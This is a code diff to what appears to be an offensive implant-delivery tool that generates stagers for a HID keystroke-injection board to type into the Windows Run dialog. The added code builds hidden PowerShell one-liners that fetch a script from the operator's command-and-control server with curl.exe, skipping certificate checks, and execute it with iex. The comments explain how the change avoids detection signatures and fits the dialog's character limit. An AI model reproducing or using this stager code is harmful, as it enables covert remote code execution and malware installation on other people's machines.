@@ -56,6 +56,12 @@ DEFAULT_ATTEMPTS = 20
 # is the entire reason the download mode exists.
 MAX_TYPED_CHARS = 600
 
+#: The Windows Run dialog's edit box — where `--run` makes a board type — takes
+#: roughly 260 characters, and it truncates SILENTLY. A 281-char command looks
+#: perfect in the artefact and dies on the target with nothing to read, so the
+#: Windows budget is the dialog's, not the (much larger) general one.
+WIN_RUN_MAX_CHARS = 250
+
 # Where a SHORT stager fetches from. Two different KINDS of endpoint, one
 # pairing to get right: Windows iex's a SCRIPT (the raw shellcode `/x` carries
 # is not text), while the POSIX families fetch the compiled beacon directly.
@@ -188,7 +194,33 @@ def build_short_stager(platform: str, url: str, *,
         if loader == "mshta":
             # shortest, windowless, but a single shot (cannot loop)
             return f'mshta "{url}"'
-        fetch = ("iex(iwr '" + url + "' -UseB).Content")
+        # MEASURED on Windows 10/11 PowerShell 5.1 (2026-10-30 -> 2026-10-31):
+        # `iwr` to the tool's own HTTPS listener dies at the SEND stage (the
+        # handshake completes, the write then fails), while `curl.exe` gets a
+        # clean 200 from the same URL. And the self-signed certificate used to
+        # cost 71 characters of `ServerCertificateValidationCallback={$true}` —
+        # which is BOTH a top-tier signature and the thing that pushed the
+        # retry loop over the Run dialog's ~250-char budget.
+        #
+        # `curl.exe` (a signed system binary, present since Windows 10 1803)
+        # answers both at once: `-k` skips the self-signed certificate, `-f`
+        # turns an HTTP error into a curl FAILURE so the bounded loop retries
+        # instead of `iex`-ing an error page, and the typed text no longer
+        # contains `DownloadString` or a certificate bypass. Verified on this
+        # machine: hidden PowerShell + curl + `iex $s` runs the fetched script.
+        #
+        # `if(!$s.Trim()){throw}` is not decoration: a REACHABLE C2 that
+        # answers 200 with an empty body must still count as a failed fetch, or
+        # the loop breaks on the first attempt and the payload is lost.
+        fetch = (f"$s=(curl.exe -skf '{url}' | Out-String);"
+                 f"if(!$s.Trim()){{throw 'empty'}};iex $s")
+        # ONE attempt means no loop at all rather than a `while` that can only
+        # run once: the wrapper costs ~54 chars and the Windows Run dialog (the
+        # channel a HID board types into) is capped around 260, so a pointless
+        # loop can be the difference between a command that runs and a
+        # truncated one that does not.
+        if int(attempts) <= 1:
+            return 'powershell -w h -c "' + fetch + '"'
         loop = _win_retry_loop(fetch, retry_s, attempts)
         return 'powershell -w h -c "' + loop + '"'
 
@@ -374,6 +406,21 @@ def hid_download_command(platform: str, host: str, port: int, *,
     url = short_stager_url(platform, f"{scheme}://{host}:{int(port)}", token)
     command = build_short_stager(platform, url, host=host, port=int(port),
                                  ssl=ssl, retry_s=retry_s, attempts=tries)
+    if platform == "windows":
+        # Retry first, length second: the bounded loop is what makes a single
+        # physical plug survive one network hiccup, and it is exactly what
+        # pushes the command past the dialog's limit. Dropping it keeps the
+        # delivery working and leaves "plug it again" as the retry — the
+        # operator is standing right there.
+        if len(command) > WIN_RUN_MAX_CHARS and tries > 1:
+            command = build_short_stager(platform, url, host=host, port=int(port),
+                                         ssl=ssl, retry_s=retry_s, attempts=1)
+        if len(command) > WIN_RUN_MAX_CHARS:
+            raise ValueError(
+                f"the windows download stager is {len(command)} chars, over "
+                f"the {WIN_RUN_MAX_CHARS}-char Run-dialog budget (the dialog "
+                f"truncates silently) — shorten the address, or use "
+                f"--stager-mode inline")
     if len(command) > MAX_TYPED_CHARS:
         raise ValueError(
             f"the {platform} download stager is {len(command)} chars, over "
